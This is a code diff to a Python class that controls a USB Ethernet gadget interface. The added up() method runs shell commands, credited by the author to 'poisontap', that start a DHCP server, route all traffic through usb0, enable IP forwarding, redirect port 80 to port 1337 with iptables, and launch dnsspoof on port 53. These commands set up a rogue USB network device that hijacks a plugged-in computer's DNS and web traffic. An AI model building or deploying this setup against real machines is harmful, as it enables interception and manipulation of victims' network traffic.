@@ -72,16 +72,28 @@ class FwComponentNetwork(FwComponentGadget):
 
     # Turning on USB Ethernet adapter
     def up(self):
-        subprocess.call(["./shell_scripts/usb_net_up.sh"])  # Run shell script to enable DHCP server and spoof ports
-        self.state = "eth up"
+        #  subprocess.call(["./shell_scripts/usb_net_up.sh"])  # Run shell script to enable DHCP server and spoof ports
+        subprocess.call("ifup usb0", shell=True)  # Up usb0 interface
+        subprocess.call("ifconfig usb0 up", shell=True)  # Up networking on usb0
+        subprocess.call("/bin/route add -net 0.0.0.0/0 usb0", shell=True)  # Add route for all IPv4 addresses
+        subprocess.call("/etc/init.d/isc-dhcp-server", shell=True)  # Start DHCP server
+
+        # Does things (stolen from poisontap)
+        subprocess.call("/sbin/sysctl -w net.ipv4.ip_forward=1", shell=True)  # No idea what this does
+        subprocess.call("/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337", shell=True)  # Bind port 80 to port 1337
+        subprocess.call("/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53", shell=True)  # Start dnsspoof on port 53
+        self.state = "usb0 up"
         if self.debug:  # Debug text
             super().debug(self.state)
         return self.test_internet()  # Test connection
 
     # Turning off USB Ethernet adapter
     def down(self):
-        subprocess.call(["./shell_scripts/usb_net_down.sh"])  # Down adapter
-        self.state = "eth down"
+        #  subprocess.call(["./shell_scripts/usb_net_down.sh"])  # Down adapter
+        subprocess.call("/etc/init.d/isc-dhcp-server stop", shell=True)
+        subprocess.call("ifconfig usb0 down", shell=True)
+        subprocess.call("ifdown usb0", shell=True)
+        self.state = "usb0 down"
         if self.debug:  # Debug text
             super().debug(self.state)
         return
